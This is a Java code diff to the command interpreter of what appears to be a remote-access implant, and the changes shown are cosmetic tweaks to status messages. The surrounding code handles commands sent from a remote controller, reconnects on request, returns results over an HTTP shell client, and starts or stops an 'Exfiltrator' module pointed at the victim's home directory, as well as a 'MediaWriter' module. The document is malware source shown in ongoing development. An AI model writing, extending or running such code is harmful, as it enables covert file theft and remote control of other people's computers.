@@ -42,7 +42,7 @@ public class CmdInterpreter {
                 continue; // ignore command / nothing
             }
 
-            System.out.printf("[*] Command received: '%s.\n", command.cmdString);
+            System.out.printf("\n[*] Command received: '%s.\n", command.cmdString);
             if(command.cmdString.equalsIgnoreCase("__init__")) {
                 // reconnect and try again
                 manager.connect();
@@ -100,31 +100,31 @@ public class CmdInterpreter {
         switch (moduleName.toLowerCase()) {
             case "mediawriter" -> {
                 if(MediaWriter.isStopped()) {
-                    shellHttpClient.sendCmdResult("MediaWriter is already stopped.");
+                    shellHttpClient.sendCmdResult("[*] MediaWriter is already stopped.");
                     return;
                 }
 
                 MediaWriter.shutdown();
                 if(MediaWriter.isStopped()) {
-                    shellHttpClient.sendCmdResult("Mediawriter stopped.");
+                    shellHttpClient.sendCmdResult("[*] Mediawriter stopped.");
                 }
                 else {
-                    shellHttpClient.sendCmdResult("Failed to stop Mediawriter. Try again.");
+                    shellHttpClient.sendCmdResult("[*] Failed to stop Mediawriter. Try again.");
                 }
             }
 
             case "exfiltrator" -> {
                 if(Exfiltrator.isStopped()) {
-                    shellHttpClient.sendCmdResult("Exfitrator is already stopped.");
+                    shellHttpClient.sendCmdResult("[*] Exfitrator is already stopped.");
                     return;
                 }
 
                 Exfiltrator.shutdown();
                 if(Exfiltrator.isStopped()) {
-                    shellHttpClient.sendCmdResult("Exfiltrator stopped.");
+                    shellHttpClient.sendCmdResult("[*] Exfiltrator stopped.");
                 }
                 else {
-                    shellHttpClient.sendCmdResult("Failed to stop Exfiltrator. Try again.");
+                    shellHttpClient.sendCmdResult("[*] Failed to stop Exfiltrator. Try again.");
                 }
             }
         }
@@ -141,7 +141,7 @@ public class CmdInterpreter {
         switch (moduleName.toLowerCase()) {
             case "mediawriter" -> {
                 if(!MediaWriter.isStopped()) {
-                    shellHttpClient.sendCmdResult("MediaWriter is already running.");
+                    shellHttpClient.sendCmdResult("[*] MediaWriter is already running.");
                     return;
                 }
 
@@ -153,18 +153,18 @@ public class CmdInterpreter {
                 MediaWriter mediaWriter = MediaWriter.getInstance(config);
                 manager.executeThread(mediaWriter);
 
-                shellHttpClient.sendCmdResult("Mediawriter started.");
+                shellHttpClient.sendCmdResult("[*] Mediawriter started.");
             }
 
             case "exfiltrator" -> {
                 if(!Exfiltrator.isStopped()) {
-                    shellHttpClient.sendCmdResult("Exfiltrator is already running.");
+                    shellHttpClient.sendCmdResult("[*] Exfiltrator is already running.");
                     return;
                 }
 
                 Exfiltrator exfiltrator = new Exfiltrator(System.getProperty("user.home"));
                 manager.executeThread(exfiltrator);
-                shellHttpClient.sendCmdResult("Exfiltrator started.");
+                shellHttpClient.sendCmdResult("[*] Exfiltrator started.");
             }
         }
     }
